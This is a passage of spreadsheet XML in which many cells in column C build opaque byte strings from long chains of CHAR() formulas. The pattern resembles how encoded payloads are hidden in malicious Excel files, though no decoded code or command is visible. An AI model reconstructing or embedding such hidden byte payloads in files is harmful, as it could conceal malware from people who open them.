    <row r="768" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C768" t="str">
        <f>CHAR(136)&amp;CHAR(166)&amp;CHAR(81)&amp;CHAR(223)&amp;CHAR(235)&amp;CHAR(252)&amp;CHAR(15)&amp;CHAR(149)&amp;CHAR(213)&amp;CHAR(255)</f>
        <v>ˆ¦Qßëü_x000F_•Õÿ</v>
      </c>
    </row>
    <row r="769" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C769" t="str">
        <f>CHAR(16)&amp;CHAR(129)&amp;CHAR(250)&amp;CHAR(232)&amp;CHAR(98)&amp;CHAR(208)&amp;CHAR(151)&amp;CHAR(187)&amp;CHAR(75)&amp;CHAR(195)</f>
        <v>_x0010_úèbÐ—»KÃ</v>
      </c>
    </row>
    <row r="770" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C770" t="str">
        <f>CHAR(179)&amp;CHAR(245)&amp;CHAR(79)&amp;CHAR(192)&amp;CHAR(142)&amp;CHAR(187)&amp;CHAR(76)&amp;CHAR(208)&amp;CHAR(186)&amp;CHAR(228)</f>
        <v>³õOÀŽ»LÐºä</v>
      </c>
    </row>
    <row r="771" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C771" t="str">
        <f>CHAR(1)&amp;CHAR(245)&amp;CHAR(142)&amp;CHAR(173)&amp;CHAR(82)&amp;CHAR(216)&amp;CHAR(181)&amp;CHAR(131)&amp;CHAR(68)&amp;CHAR(220)</f>
        <v>_x0001_õŽ­RØµƒDÜ</v>
      </c>
    </row>
    <row r="772" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C772" t="str">
        <f>CHAR(175)&amp;CHAR(160)&amp;CHAR(85)&amp;CHAR(212)&amp;CHAR(184)&amp;CHAR(245)&amp;CHAR(67)&amp;CHAR(146)&amp;CHAR(204)&amp;CHAR(174)</f>
        <v>¯ UÔ¸õC’Ì®</v>
      </c>
    </row>
    <row r="773" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C773" t="str">
        <f>CHAR(11)&amp;CHAR(210)&amp;CHAR(227)&amp;CHAR(254)&amp;CHAR(16)&amp;CHAR(156)&amp;CHAR(200)&amp;CHAR(251)&amp;CHAR(91)&amp;CHAR(129)</f>
        <v>_x000B_Òãþ_x0010_œÈû[</v>
      </c>
    </row>
    <row r="774" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C774" t="str">
        <f>CHAR(238)&amp;CHAR(241)&amp;CHAR(52)&amp;CHAR(164)&amp;CHAR(175)&amp;CHAR(205)&amp;CHAR(46)&amp;CHAR(226)&amp;CHAR(189)&amp;CHAR(161)</f>
        <v>îñ4¤¯Í.â½¡</v>
      </c>
    </row>
    <row r="775" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C775" t="str">
        <f>CHAR(81)&amp;CHAR(243)&amp;CHAR(158)&amp;CHAR(189)&amp;CHAR(87)&amp;CHAR(215)&amp;CHAR(191)&amp;CHAR(171)&amp;CHAR(64)&amp;CHAR(209)</f>
        <v>Qóž½W×¿«@Ñ</v>
      </c>
    </row>
    <row r="776" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C776" t="str">
        <f>CHAR(146)&amp;CHAR(160)&amp;CHAR(80)&amp;CHAR(176)&amp;CHAR(222)&amp;CHAR(127)&amp;CHAR(91)&amp;CHAR(249)&amp;CHAR(173)&amp;CHAR(214)</f>
        <v>’ P°Þ[ù­Ö</v>
      </c>
    </row>
    <row r="777" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C777" t="str">
        <f>CHAR(10)&amp;CHAR(81)&amp;CHAR(95)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v xml:space="preserve">
Q_È!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="778" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C778" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(61)&amp;CHAR(201)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!=ÉÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="779" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C779" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(15)&amp;CHAR(228)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;_x000F_äÈ!¥</v>
      </c>
    </row>
    <row r="780" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C780" t="str">
        <f>CHAR(219)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ÛÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="781" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C781" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="782" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C782" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(21)&amp;CHAR(201)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!_x0015_ÉÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="783" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C783" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="784" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C784" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(144)</f>
        <v>ûÏ&gt;±ÖÈ!¥û</v>
      </c>
    </row>
    <row r="785" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C785" t="str">
        <f>CHAR(125)&amp;CHAR(222)&amp;CHAR(164)&amp;CHAR(141)&amp;CHAR(89)&amp;CHAR(192)&amp;CHAR(182)&amp;CHAR(174)&amp;CHAR(87)&amp;CHAR(223)</f>
        <v>}Þ¤YÀ¶®Wß</v>
      </c>
    </row>
    <row r="786" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C786" t="str">
        <f>CHAR(214)&amp;CHAR(165)&amp;CHAR(82)&amp;CHAR(198)&amp;CHAR(148)&amp;CHAR(189)&amp;CHAR(91)&amp;CHAR(212)&amp;CHAR(248)&amp;CHAR(172)</f>
        <v>Ö¥RÆ”½[Ôø¬</v>
      </c>
    </row>
    <row r="787" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C787" t="str">
        <f>CHAR(77)&amp;CHAR(201)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(128)&amp;CHAR(128)&amp;CHAR(165)</f>
        <v>MÉûÏ&gt;±Ö€€¥</v>
      </c>
    </row>
    <row r="788" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C788" t="str">
        <f>CHAR(219)&amp;CHAR(143)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(90)&amp;CHAR(27)&amp;CHAR(207)</f>
        <v>Û&gt;±ÖÈ!Z_x001B_Ï</v>
      </c>
    </row>
    <row r="789" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C789" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="790" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C790" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="791" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C791" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="792" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C792" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="793" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C793" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="794" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C794" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="795" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C795" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="796" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C796" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="797" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C797" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="798" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C798" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="799" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C799" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="800" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C800" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="801" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C801" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="802" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C802" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="803" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C803" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="804" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C804" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="805" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C805" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="806" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C806" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="807" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C807" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="808" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C808" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="809" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C809" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="810" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C810" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="811" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C811" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="812" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C812" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="813" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C813" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="814" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C814" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="815" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C815" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="816" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C816" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="817" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C817" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="818" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C818" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(89)&amp;CHAR(19)&amp;CHAR(64)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(168)</f>
        <v>ÖÈ!Y_x0013_@&gt;±Ö¨</v>
      </c>
    </row>
    <row r="819" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C819" t="str">
        <f>CHAR(168)&amp;CHAR(64)&amp;CHAR(202)&amp;CHAR(29)&amp;CHAR(90)&amp;CHAR(58)&amp;CHAR(132)&amp;CHAR(248)&amp;CHAR(170)&amp;CHAR(247)</f>
        <v>¨@Ê_x001D_Z:„øª÷</v>
      </c>
    </row>
    <row r="820" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C820" t="str">
        <f>CHAR(247)&amp;CHAR(68)&amp;CHAR(108)&amp;CHAR(165)&amp;CHAR(93)&amp;CHAR(186)&amp;CHAR(9)&amp;CHAR(148)&amp;CHAR(4)&amp;CHAR(192)</f>
        <v>÷Dl¥]º	”_x0004_À</v>
      </c>
    </row>
    <row r="821" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C821" t="str">
        <f>CHAR(137)&amp;CHAR(251)&amp;CHAR(240)&amp;CHAR(249)&amp;CHAR(225)&amp;CHAR(9)&amp;CHAR(199)&amp;CHAR(174)&amp;CHAR(66)&amp;CHAR(179)</f>
        <v>‰ûðùá	Ç®B³</v>
      </c>
    </row>
    <row r="822" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C822" t="str">
        <f>CHAR(250)&amp;CHAR(232)&amp;CHAR(224)&amp;CHAR(106)&amp;CHAR(246)&amp;CHAR(206)&amp;CHAR(249)&amp;CHAR(248)&amp;CHAR(163)&amp;CHAR(39)</f>
        <v>úèàjöÎùø£'</v>
      </c>
    </row>
    <row r="823" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C823" t="str">
        <f>CHAR(115)&amp;CHAR(242)&amp;CHAR(112)&amp;CHAR(157)&amp;CHAR(46)&amp;CHAR(58)&amp;CHAR(148)&amp;CHAR(244)&amp;CHAR(32)&amp;CHAR(117)</f>
        <v>sòp.:”ô u</v>
      </c>
    </row>
    <row r="824" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C824" t="str">
        <f>CHAR(112)&amp;CHAR(143)&amp;CHAR(70)&amp;CHAR(52)&amp;CHAR(22)&amp;CHAR(188)&amp;CHAR(109)&amp;CHAR(164)&amp;CHAR(43)&amp;CHAR(68)</f>
        <v>pF4_x0016_¼m¤+D</v>
      </c>
    </row>
    <row r="825" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C825" t="str">
        <f>CHAR(102)&amp;CHAR(145)&amp;CHAR(215)&amp;CHAR(27)&amp;CHAR(170)&amp;CHAR(237)&amp;CHAR(227)&amp;CHAR(159)&amp;CHAR(187)&amp;CHAR(120)</f>
        <v>f‘×_x001B_ªíãŸ»x</v>
      </c>
    </row>
    <row r="826" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C826" t="str">
        <f>CHAR(162)&amp;CHAR(244)&amp;CHAR(104)&amp;CHAR(46)&amp;CHAR(207)&amp;CHAR(68)&amp;CHAR(63)&amp;CHAR(103)&amp;CHAR(231)&amp;CHAR(55)</f>
        <v>¢ôh.ÏD?gç7</v>
      </c>
    </row>
    <row r="827" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C827" t="str">
        <f>CHAR(16)&amp;CHAR(101)&amp;CHAR(87)&amp;CHAR(14)&amp;CHAR(241)&amp;CHAR(188)&amp;CHAR(215)&amp;CHAR(15)&amp;CHAR(25)&amp;CHAR(69)</f>
        <v>_x0010_eW_x000E_ñ¼×_x000F__x0019_E</v>
      </c>
    </row>
    <row r="828" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C828" t="str">
        <f>CHAR(142)&amp;CHAR(59)&amp;CHAR(61)&amp;CHAR(204)&amp;CHAR(46)&amp;CHAR(243)&amp;CHAR(92)&amp;CHAR(129)&amp;CHAR(142)&amp;CHAR(47)</f>
        <v>Ž;=Ì.ó\Ž/</v>
      </c>
    </row>
    <row r="829" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C829" t="str">
        <f>CHAR(102)&amp;CHAR(58)&amp;CHAR(142)&amp;CHAR(236)&amp;CHAR(32)&amp;CHAR(118)&amp;CHAR(157)&amp;CHAR(68)&amp;CHAR(50)&amp;CHAR(250)</f>
        <v>f:Žì vD2ú</v>
      </c>
    </row>
    <row r="830" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C830" t="str">
        <f>CHAR(93)&amp;CHAR(144)&amp;CHAR(61)&amp;CHAR(164)&amp;CHAR(40)&amp;CHAR(68)&amp;CHAR(58)&amp;CHAR(58)&amp;CHAR(215)&amp;CHAR(24)</f>
        <v>]=¤(D::×_x0018_</v>
      </c>
    </row>
    <row r="831" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C831" t="str">
        <f>CHAR(168)&amp;CHAR(225)&amp;CHAR(223)&amp;CHAR(235)&amp;CHAR(101)&amp;CHAR(234)&amp;CHAR(183)&amp;CHAR(145)&amp;CHAR(123)&amp;CHAR(244)</f>
        <v>¨áßëeê·‘{ô</v>
      </c>
    </row>
    <row r="832" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C832" t="str">
        <f>CHAR(4)&amp;CHAR(47)&amp;CHAR(102)&amp;CHAR(238)&amp;CHAR(140)&amp;CHAR(67)&amp;CHAR(51)&amp;CHAR(76)&amp;CHAR(123)&amp;CHAR(48)</f>
        <v>_x0004_/fîŒC3L{0</v>
      </c>
    </row>
    <row r="833" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C833" t="str">
        <f>CHAR(193)&amp;CHAR(78)&amp;CHAR(139)&amp;CHAR(160)&amp;CHAR(18)&amp;CHAR(151)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(86)&amp;CHAR(198)</f>
        <v>ÁN‹ _x0012_—ûÏVÆ</v>
      </c>
    </row>
    <row r="834" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C834" t="str">
        <f>CHAR(165)&amp;CHAR(250)&amp;CHAR(126)&amp;CHAR(241)&amp;CHAR(147)&amp;CHAR(131)&amp;CHAR(73)&amp;CHAR(151)&amp;CHAR(209)&amp;CHAR(65)</f>
        <v>¥ú~ñ“ƒI—ÑA</v>
      </c>
    </row>
    <row r="835" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C835" t="str">
        <f>CHAR(201)&amp;CHAR(90)&amp;CHAR(43)&amp;CHAR(119)&amp;CHAR(174)&amp;CHAR(176)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(8)&amp;CHAR(97)</f>
        <v>ÉZ+w®°ÖÈ_x0008_a</v>
      </c>
    </row>
    <row r="836" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C836" t="str">
        <f>CHAR(175)&amp;CHAR(159)&amp;CHAR(86)&amp;CHAR(152)&amp;CHAR(86)&amp;CHAR(163)&amp;CHAR(33)&amp;CHAR(90)&amp;CHAR(46)&amp;CHAR(165)</f>
        <v>¯ŸV˜V£!Z.¥</v>
      </c>
    </row>
    <row r="837" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C837" t="str">
        <f>CHAR(52)&amp;CHAR(217)&amp;CHAR(22)&amp;CHAR(96)&amp;CHAR(91)&amp;CHAR(69)&amp;CHAR(147)&amp;CHAR(205)&amp;CHAR(62)&amp;CHAR(180)</f>
        <v>4Ù_x0016_`[E“Í&gt;´</v>
      </c>
    </row>
    <row r="838" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C838" t="str">
        <f>CHAR(239)&amp;CHAR(65)&amp;CHAR(199)&amp;CHAR(245)&amp;CHAR(171)&amp;CHAR(159)&amp;CHAR(110)&amp;CHAR(241)&amp;CHAR(134)&amp;CHAR(136)</f>
        <v>ïAÇõ«Ÿnñ†ˆ</v>
      </c>
    </row>
    <row r="839" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C839" t="str">
        <f>CHAR(113)&amp;CHAR(205)&amp;CHAR(17)&amp;CHAR(192)&amp;CHAR(225)&amp;CHAR(81)&amp;CHAR(41)&amp;CHAR(29)&amp;CHAR(182)&amp;CHAR(207)</f>
        <v>qÍ_x0011_ÀáQ)_x001D_¶Ï</v>
      </c>
    </row>
    <row r="840" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C840" t="str">
        <f>CHAR(235)&amp;CHAR(153)&amp;CHAR(105)&amp;CHAR(217)&amp;CHAR(79)&amp;CHAR(109)&amp;CHAR(85)&amp;CHAR(196)&amp;CHAR(4)&amp;CHAR(26)</f>
        <v>ë™iÙOmUÄ_x0004__x001A_</v>
      </c>
    </row>
    <row r="841" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C841" t="str">
        <f>CHAR(187)&amp;CHAR(113)&amp;CHAR(162)&amp;CHAR(194)&amp;CHAR(222)&amp;CHAR(235)&amp;CHAR(243)&amp;CHAR(186)&amp;CHAR(210)&amp;CHAR(89)</f>
        <v>»q¢ÂÞëóºÒY</v>
      </c>
    </row>
    <row r="842" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C842" t="str">
        <f>CHAR(177)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(145)&amp;CHAR(207)&amp;CHAR(84)&amp;CHAR(181)&amp;CHAR(128)&amp;CHAR(159)</f>
        <v>±È!¥‘ÏTµ€Ÿ</v>
      </c>
    </row>
    <row r="843" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C843" t="str">
        <f>CHAR(73)&amp;CHAR(167)&amp;CHAR(34)&amp;CHAR(7)&amp;CHAR(97)&amp;CHAR(78)&amp;CHAR(3)&amp;CHAR(75)&amp;CHAR(217)&amp;CHAR(165)</f>
        <v>I§"_x0007_aN_x0003_KÙ¥</v>
      </c>
    </row>
    <row r="844" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C844" t="str">
